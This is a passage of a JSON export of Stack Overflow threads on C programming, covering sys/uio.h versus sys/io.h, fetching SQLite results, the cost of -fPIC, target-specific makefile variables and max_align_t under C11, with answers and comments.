"Fermat&#39;s Little Student", "link": "https://stackoverflow.com/users/1467926/fermats-little-student"}, "reply_to_user": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444859944, "post_id": 33135596, "comment_id": 54084202, "body": "@alk So isnt it better to just use <code>&lt;sys&#47;uio.h&gt;</code> for portability? What&#39;s the benefit of having <code>&lt;sys&#47;io.h&gt;</code>?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444859981, "post_id": 33135596, "comment_id": 54084223, "body": "As far as I see this, <code>&lt;sys&#47;io.h&gt;</code> is (mostly?) Linux specific."}], "answers": [{"tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": true, "score": 4, "last_activity_date": 1444860934, "creation_date": 1444860934, "answer_id": 33136529, "question_id": 33135596, "link": "https://stackoverflow.com/questions/33135596/what-is-the-difference-between-uio-h-and-io-h/33136529#33136529", "title": "what is the difference between uio.h and io.h?", "body": "<p>Generally speaking, it is not safe or even sensible to simply change the name of a header file being included when the compiler cannot find that header.  Headers with similar names do not necessarily have anything to do with each other.</p>\n\n<p>That appears to be the case here: the GLIBC header file <code>sys/io.h</code> does not declare the vectored I/O functions of the POSIX-specified header <code>sys/uio.h</code>, at least not directly.  In fact, GLIBC also provides <code>sys/uio.h</code>.  They're different.  Neither C nor POSIX provides any reason to believe that <code>sys/uio.h</code> on one system would provide any declarations that are provided by a header named <code>sys/io.h</code> on that or any other system.</p>\n\n<p>If you are trying to build C code and some header cannot be found, then the first thing to consider is the include search path, and whether the header name needs a path segments added or removed.  The next thing to consider is whether that header is needed at all in the build environment.  If it is not, then changing the header to name some other header that is actually present will fix the build, but so would deleting the <code>include</code> directive altogether.</p>\n\n<p>I'd rate it better, in fact, to remove or comment out such a failing <code>include</code> directive, make sure warnings are cranked up, and see what, if any, missing declarations the compiler then complains about.  That will give you a handle with which to determine what header, if any, you should include in place of the missing one.</p>\n"}], "owner": {"reputation": 4731, "user_id": 1467926, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/e0148d321d2f35a32f9c93d1d5dac478?s=128&d=identicon&r=PG&f=1", "display_name": "Fermat&#39;s Little Student", "link": "https://stackoverflow.com/users/1467926/fermats-little-student"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1568, "favorite_count": 0, "accepted_answer_id": 33136529, "answer_count": 1, "score": 3, "last_activity_date": 1444860934, "creation_date": 1444856873, "last_edit_date": 1444859505, "question_id": 33135596, "link": "https://stackoverflow.com/questions/33135596/what-is-the-difference-between-uio-h-and-io-h", "title": "what is the difference between uio.h and io.h?", "body": "<p>Sometimes I see compiler complaining about this line</p>\n\n<pre><code>#include &lt;sys/io.h&gt;\n</code></pre>\n\n<p>with </p>\n\n<blockquote>\n  <p>fatal error: sys/io.h: No such file or directory</p>\n</blockquote>\n\n<p>If I simply change it to</p>\n\n<pre><code>#include &lt;sys/uio.h&gt;\n</code></pre>\n\n<p>It will magically work. Can someone explain to me the difference? Why do some OSes have one but not the other?</p>\n\n<p>Edit: This issue happens on a Linux, not just OS X.</p>\n"}, {"tags": ["c", "sqlite"], "comments": [{"owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 1, "creation_date": 1444857079, "post_id": 33135311, "comment_id": 54082900, "body": "What is <code>sn</code> and why do you need to interpolate it in the query? Use query parameters instead of <code>snprintf</code>. Use <a href=\"http://sqlite.org/c3ref/column_blob.html\" rel=\"nofollow noreferrer\"><code>sqlite3_column_*</code></a> to get query results."}, {"owner": {"reputation": 31255, "user_id": 28494, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/c14ME.gif?s=128&g=1", "display_name": "qrdl", "link": "https://stackoverflow.com/users/28494/qrdl"}, "edited": false, "score": 0, "creation_date": 1444857553, "post_id": 33135311, "comment_id": 54083087, "body": "Take a look at <code>sqlite3_column_xxx</code> family of functions"}], "answers": [{"comments": [{"owner": {"reputation": 113, "user_id": 4760088, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/871b48f10e2b675b5aee86222a982c30?s=128&d=identicon&r=PG&f=1", "display_name": "Javi9207", "link": "https://stackoverflow.com/users/4760088/javi9207"}, "edited": false, "score": 0, "creation_date": 1445291295, "post_id": 33148232, "comment_id": 54253547, "body": "Sorry for the late answer, I researched a little about those functions, Thanks"}], "tags": [], "owner": {"reputation": 41, "user_id": 5340654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ad6533799bdfde79e28a29f1b8af533a?s=128&d=identicon&r=PG&f=1", "display_name": "Bijaya", "link": "https://stackoverflow.com/users/5340654/bijaya"}, "is_accepted": true, "score": 0, "last_activity_date": 1444911128, "creation_date": 1444911128, "answer_id": 33148232, "question_id": 33135311, "link": "https://stackoverflow.com/questions/33135311/get-data-from-sqlite3-in-c/33148232#33148232", "title": "Get data from sqlite3 in C", "body": "<p>Since \"Msg\" is TEXT. So in while loop you can call \"sqlite3_column_text()\"</p>\n\n<pre><code>while( sqlite3_step( res ) == SQLITE_ROW )\n{\n   const char *msg = sqlite3_column_text(res, 0);\n   //Use msg\n}\n</code></pre>\n\n<p>To get the proper result, make sure that <code>commands</code> i.e. your sql query is proper.</p>\n"}], "owner": {"reputation": 113, "user_id": 4760088, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/871b48f10e2b675b5aee86222a982c30?s=128&d=identicon&r=PG&f=1", "display_name": "Javi9207", "link": "https://stackoverflow.com/users/4760088/javi9207"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 148, "favorite_count": 0, "accepted_answer_id": 33148232, "answer_count": 1, "score": -1, "last_activity_date": 1444911128, "creation_date": 1444855745, "last_edit_date": 1444859035, "question_id": 33135311, "link": "https://stackoverflow.com/questions/33135311/get-data-from-sqlite3-in-c", "title": "Get data from sqlite3 in C", "body": "<p>I am creating a server that saves msgs into a database( sqlite3 )then send them to some clients, The question is how to get data from the database, by the way I am new into the sqlite3 API in C,here is some part of the code I Have:</p>\n\n<pre><code>snprintf( commands, 256, \"SELECT Msg FROM %s WHERE timeStamp BETWEEN %ld AND %ld;\",\n        sn, ( serverTime - diff-&gt;tv_sec ), serverTime );\n\nrc = sqlite3_prepare_v2( db, commands, -1, &amp;res, 0 );\n\nwhile( sqlite3_step( res ) == SQLITE_ROW )\n{\n\n    // ????????\n\n}\n</code></pre>\n\n<p>I have a table with usernames that has 3 columns: \"Id INTEGER PRIMARY KEY, timeStamp INT, Msg TEXT\"</p>\n\n<p>I want to get the msgs that are the difference of server time and last connection from the client ( serverTime - diff->tv_sec ) </p>\n"}, {"tags": ["c++", "c", "gcc"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 2, "creation_date": 1444855336, "post_id": 33135142, "comment_id": 54082014, "body": "Relocation costs extra indirection and increases code size, and you may wish to take that into account. But best to measure and compare!"}, {"owner": {"reputation": 12286, "user_id": 1607442, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/18451ad16ed8ad45b0a18bf70b2aa002?s=128&d=identicon&r=PG", "display_name": "Ivan Aksamentov - Drop", "link": "https://stackoverflow.com/users/1607442/ivan-aksamentov-drop"}, "edited": false, "score": 1, "creation_date": 1444858420, "post_id": 33135142, "comment_id": 54083505, "body": "Related: <a href=\"http://stackoverflow.com/questions/14990461/why-does-arm-linux-androideabi-gcc-enforce-fpic\">Why does arm-linux-androideabi-gcc enforce -fpic?</a>"}], "answers": [{"comments": [{"owner": {"reputation": 12286, "user_id": 1607442, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/18451ad16ed8ad45b0a18bf70b2aa002?s=128&d=identicon&r=PG", "display_name": "Ivan Aksamentov - Drop", "link": "https://stackoverflow.com/users/1607442/ivan-aksamentov-drop"}, "edited": false, "score": 0, "creation_date": 1444858584, "post_id": 33135223, "comment_id": 54083581, "body": "It worth mention that there are not only x86 and x86_64 out there (their current share maybe even less than everything else)"}], "tags": [], "owner": {"reputation": 15136, "user_id": 4044696, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/54xyv.jpg?s=128&g=1", "display_name": "Severin Pappadeux", "link": "https://stackoverflow.com/users/4044696/severin-pappadeux"}, "is_accepted": false, "score": 2, "last_activity_date": 1444855396, "creation_date": 1444855396, "answer_id": 33135223, "question_id": 33135142, "link": "https://stackoverflow.com/questions/33135142/is-fpic-always-on-a-bad-idea/33135223#33135223", "title": "Is -fPIC always on a bad idea?", "body": "<p>Well, always compiling with -fPIC will produce a bit more bloated and a bit slower code.</p>\n\n<p>Difference would be less visible on x64 target, I believe</p>\n\n<p>You shall measure and decide if those differences are relevant for you app, you might be ok with it</p>\n"}], "owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 238, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1444855396, "creation_date": 1444855089, "question_id": 33135142, "link": "https://stackoverflow.com/questions/33135142/is-fpic-always-on-a-bad-idea", "title": "Is -fPIC always on a bad idea?", "body": "<p>Is there any harm in always compiling with <code>-fPIC</code> even if I might not intend to link the resulting relocatable object files into a shared library?</p>\n"}, {"tags": ["c", "makefile"], "comments": [{"owner": {"reputation": 1103, "user_id": 893601, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/503d2dd57d66237ff913d6d3abfb330e?s=128&d=identicon&r=PG", "display_name": "felknight", "link": "https://stackoverflow.com/users/893601/felknight"}, "reply_to_user": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1444855836, "post_id": 33135067, "comment_id": 54082267, "body": "You were right. Corrected the minimal code that produces the error"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1444857726, "post_id": 33135067, "comment_id": 54083173, "body": "target-specific variables are available in the <i>recipe</i> and in other target-specific assignments for the same target. But they&#39;re not available in the prerequisites (since they might depend on automatic variables which have no value until the prerequisites are determined). Perhaps there is a way to do this, but it seems like the traditional explicit prerequisite style is simpler. That is, if you delete  <code>OBJ =</code> from <code>target1: OBJ = foo1.o foo2.o</code> you end up with the equally maintainable <code>target1: foo1.o foo2.o</code>. :)"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "reply_to_user": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1444863306, "post_id": 33135067, "comment_id": 54085584, "body": "@EtanReisner: What makes you think it has prerequisites? I tested this with a makefile: <code>target: prereq=foo</code> <code>target: $(prereq)</code> <code>\\techo $^</code>. If the target-specific variable was available in the prerequisites, I would expect to see <code>foo</code>. But no. (The recipe for a target without prerequisites is executed unconditionally, &#191;no?)"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "reply_to_user": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 1, "creation_date": 1444864144, "post_id": 33135067, "comment_id": 54085863, "body": "@EtanReisner: In the <i>recipes</i> of their prerequisites, but not the prerequisites of their prerequisites. AFAICT. Change the sample Makefile to <code>target1: prereq=foo</code> <code>target1: target2</code> <code>target2: $(prereq)</code> <code>\\techo $^</code> and it still prints nothing. (That was actually my original test, based on the OP.) (But add <code>echo $(prereq)</code> to the recipe for target2 and you can see that it does have a value at that point.)"}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1444864277, "post_id": 33135067, "comment_id": 54085910, "body": "@rici Ah... I see. My apologies. I didn&#39;t fully consider the duplication of <code>$(OBJ)</code> in the <code>application</code> recipe. You are (as I probably should have assumed from the start =) correct."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "reply_to_user": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 1, "creation_date": 1444864514, "post_id": 33135067, "comment_id": 54085960, "body": "@EtanReisner: Well, thanks, but I don&#39;t feel totally on solid ground about <code>make</code>. I&#39;ve just learned a few tricks, some of them the hard way. Target-specific variables are seductive but I don&#39;t always predict the behaviour correctly, which is why I tried it before commenting, and why I commented instead of answering. Although I will stand by the suggestion that just writing out the prerequisites is not more work than making a target-specific list of prerequisites, at least in this case, and it requires considerably less thought. :)"}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1444864816, "post_id": 33135067, "comment_id": 54086048, "body": "I&#39;m a bit hard-pressed to come up with a good solution to this problem other than the suggested literal prerequisite writing (which might invert the order of the prerequisites and <code>application</code> which would be a problem here). The only other options I can think of offhand involve generated targets, etc."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "reply_to_user": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 1, "creation_date": 1444864947, "post_id": 33135067, "comment_id": 54086075, "body": "@Etan: One possible way to inherit a target-specific variable setting into a prerequisite&#39;s prerequisite would be to use a recursive make invocation, taking care to <code>export</code> the target-specific variable. But yuk."}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1444871954, "post_id": 33135067, "comment_id": 54087767, "body": "That was a good thought but a quick test doesn&#39;t seem to show secondary expansion working for this. I expect a quirk of how the code works since it would seem to make sense for that to work."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "reply_to_user": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1444876354, "post_id": 33135067, "comment_id": 54088815, "body": "@etan: yes, I found your earlier explanation of why it doesn&#39;t work. <a href=\"http://stackoverflow.com/questions/22679137/target-specific-variables-in-a-makefile-prerequisites\" title=\"target specific variables in a makefile prerequisites\">stackoverflow.com/questions/22679137/&hellip;</a>"}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1444876690, "post_id": 33135067, "comment_id": 54088888, "body": "@rici Seems like solid reasoning. I&#39;m glad I thought of it. =) (I would have been happier to have remembered it now though. =P)"}], "answers": [{"comments": [{"owner": {"reputation": 1103, "user_id": 893601, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/503d2dd57d66237ff913d6d3abfb330e?s=128&d=identicon&r=PG", "display_name": "felknight", "link": "https://stackoverflow.com/users/893601/felknight"}, "edited": false, "score": 0, "creation_date": 1445053465, "post_id": 33140598, "comment_id": 54171928, "body": "Thanks for the answer."}], "tags": [], "owner": {"reputation": 8293, "user_id": 3460805, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/c7Zi7.jpg?s=128&g=1", "display_name": "Chnossos", "link": "https://stackoverflow.com/users/3460805/chnossos"}, "is_accepted": true, "score": 0, "last_activity_date": 1444888074, "last_edit_date": 1444888074, "creation_date": 1444887185, "answer_id": 33140598, "question_id": 33135067, "link": "https://stackoverflow.com/questions/33135067/makefile-target-specific-files/33140598#33140598", "title": "makefile target-specific files", "body": "<p>You could go with this for instance (considering you won't call make with multiple target at once):</p>\n\n<pre><code>OBJ := foo1.o foo2.o\n\nifeq \"$(MAKECMDGOALS)\" \"target2\"\nOBJ := foo3.o foo4.o\nendif\n\ntarget1 target2: application\n\napplication: $(OBJ)\n    $(LD) $^\n</code></pre>\n"}], "owner": {"reputation": 1103, "user_id": 893601, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/503d2dd57d66237ff913d6d3abfb330e?s=128&d=identicon&r=PG", "display_name": "felknight", "link": "https://stackoverflow.com/users/893601/felknight"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 247, "favorite_count": 0, "accepted_answer_id": 33140598, "answer_count": 1, "score": 2, "last_activity_date": 1444888074, "creation_date": 1444854810, "last_edit_date": 1444855801, "question_id": 33135067, "link": "https://stackoverflow.com/questions/33135067/makefile-target-specific-files", "title": "makefile target-specific files", "body": "<p>I'm trying to make a single makefile file that compiles two different set of files. Is this posible?</p>\n\n<p>What I tried so far is:</p>\n\n<pre><code>target1: OBJ = foo1.o foo2.o  \ntarget1: application\n\ntarget2: OBJ = foo3.o foo4.o\ntarget2: application\n\napplication: $(OBJ)\n    $(LD) $(OBJ)\n</code></pre>\n\n<p>What happens is that <code>LD</code> is called with the correct parameters but make never actually checks the dependencies therefore the implicit rules that compile .c files to .o are never executed so linker fails with:</p>\n\n<pre><code>ld: cannot find foo1.o: No such file or directory\nld: cannot find foo2.o: No such file or directory\n</code></pre>\n\n<p>What is the right way to do this?</p>\n"}, {"tags": ["c", "gcc", "c11"], "comments": [{"owner": {"reputation": 25744, "user_id": 2089675, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/sBz5q.jpg?s=128&g=1", "display_name": "smac89", "link": "https://stackoverflow.com/users/2089675/smac89"}, "edited": false, "score": 3, "creation_date": 1444853608, "post_id": 33134621, "comment_id": 54081014, "body": "did you try compiling with <code>-std=c11</code>?"}, {"owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "edited": false, "score": 0, "creation_date": 1444853927, "post_id": 33134621, "comment_id": 54081216, "body": "Yes, <a href=\"http://en.cppreference.com/w/c/types/max_align_t\" rel=\"nofollow noreferrer\">max_align_t</a> is included in <code>stddef.h</code> since C11"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444854449, "post_id": 33134621, "comment_id": 54081534, "body": "Compiles fine here (gcc 4.7.2 using <code>-std=c11</code>)"}, {"owner": {"reputation": 29, "user_id": 5444662, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbf66a43d223a9f289756abdeef1a149?s=128&d=identicon&r=PG&f=1", "display_name": "andrei-volkau", "link": "https://stackoverflow.com/users/5444662/andrei-volkau"}, "edited": false, "score": 0, "creation_date": 1444855285, "post_id": 33134621, "comment_id": 54081979, "body": "Thanks for all of us. Everything is work now."}], "answers": [{"comments": [{"owner": {"reputation": 29, "user_id": 5444662, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbf66a43d223a9f289756abdeef1a149?s=128&d=identicon&r=PG&f=1", "display_name": "andrei-volkau", "link": "https://stackoverflow.com/users/5444662/andrei-volkau"}, "edited": false, "score": 0, "creation_date": 1444857124, "post_id": 33135030, "comment_id": 54082921, "body": "Thank you. But It is interesting: &quot;Why compiler, for example in c99 mode, can&#39;t do the same job as a compiler in c11 mode?&quot; In my opinion compiler in c99 mode can successfully go to the stddef.h and found there definition of max_align_t. Can somebody explain me: &quot;What is wrong in this opinion?&quot;"}, {"owner": {"reputation": 45838, "user_id": 1362568, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/EAFi0.jpg?s=128&g=1", "display_name": "Mike Kinghan", "link": "https://stackoverflow.com/users/1362568/mike-kinghan"}, "edited": false, "score": 0, "creation_date": 1444858469, "post_id": 33135030, "comment_id": 54083528, "body": "If you go to your <code>stddef.h</code> yourself and look for the definition of <code>max_align_t</code> it will become clear."}, {"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "reply_to_user": {"reputation": 29, "user_id": 5444662, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbf66a43d223a9f289756abdeef1a149?s=128&d=identicon&r=PG&f=1", "display_name": "andrei-volkau", "link": "https://stackoverflow.com/users/5444662/andrei-volkau"}, "edited": false, "score": 0, "creation_date": 1444863893, "post_id": 33135030, "comment_id": 54085790, "body": "@andrei-volkau, for C99, the identifier <code>max_align_t</code> is not reserved, so using it is an intrusion in the user name space. It is only C11 that reserves it."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1543615181, "post_id": 33135030, "comment_id": 93996799, "body": "More recent versions of gcc use <code>-std=gnu11</code> by default (C11 with GNU extensions). Use <code>-std=c11</code> if you want to be sure that C11-specific features are supported."}], "tags": [], "owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "is_accepted": true, "score": 5, "last_activity_date": 1444854674, "creation_date": 1444854674, "answer_id": 33135030, "question_id": 33134621, "link": "https://stackoverflow.com/questions/33134621/stddef-h-is-included-but-max-align-t-is-undeclared/33135030#33135030", "title": "stddef.h is included but max_align_t is undeclared", "body": "<p>To use a C11 feature you need to tell the compiler to run in C11 compliant mode.</p>\n\n<p>For gcc this can be achieved by specifying the option <code>-std=c11</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1543615272, "post_id": 53564636, "comment_id": 93996825, "body": "I don&#39;t believe this adds any information that isn&#39;t already in the accepted answer."}], "tags": [], "owner": {"reputation": 11, "user_id": 10729609, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1904e75b2c61ce96825fe4ad5713d2b9?s=128&d=identicon&r=PG", "display_name": "Michael Theobald", "link": "https://stackoverflow.com/users/10729609/michael-theobald"}, "is_accepted": false, "score": 0, "last_activity_date": 1543610503, "creation_date": 1543610503, "answer_id": 53564636, "question_id": 33134621, "link": "https://stackoverflow.com/questions/33134621/stddef-h-is-included-but-max-align-t-is-undeclared/53564636#53564636", "title": "stddef.h is included but max_align_t is undeclared", "body": "<p>I use a compiler that is natively based on c99 that has a stddef.h that it uses. On my computer I need to use the -std=c11 option and also a header file that apparently corresponds to c11.</p>\n"}], "owner": {"reputation": 29, "user_id": 5444662, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbf66a43d223a9f289756abdeef1a149?s=128&d=identicon&r=PG&f=1", "display_name": "andrei-volkau", "link": "https://stackoverflow.com/users/5444662/andrei-volkau"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1439, "favorite_count": 0, "accepted_answer_id": 33135030, "answer_count": 2, "score": 4, "last_activity_date": 1543610503, "creation_date": 1444853144, "last_edit_date": 1444854729, "question_id": 33134621, "link": "https://stackoverflow.com/questions/33134621/stddef-h-is-included-but-max-align-t-is-undeclared", "title": "stddef.h is included but max_align_t is undeclared", "body": "<p>I want to compile this code: </p>\n\n<pre><code>#include &lt;stdalign.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stddef.h&gt;\nint main ( int argc , char ** argv )\n{\n    printf (\"%zu\\n\", alignof ( max_align_t ));\n    return 0;\n}\n</code></pre>\n\n<p>But compiler says that: </p>\n\n<pre><code>error: \u2018max_align_t\u2019 undeclared\".\n</code></pre>\n\n<p><code>stddef.h</code> is included and everything must be ok, isn't it?</p>\n\n<p>P.S. I already tried to compile this code under gcc4.8 and gcc4.9, but I have error as described.</p>\n"}, {"tags": ["c", "linux", "kernel"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1444853225, "post_id": 33134452, 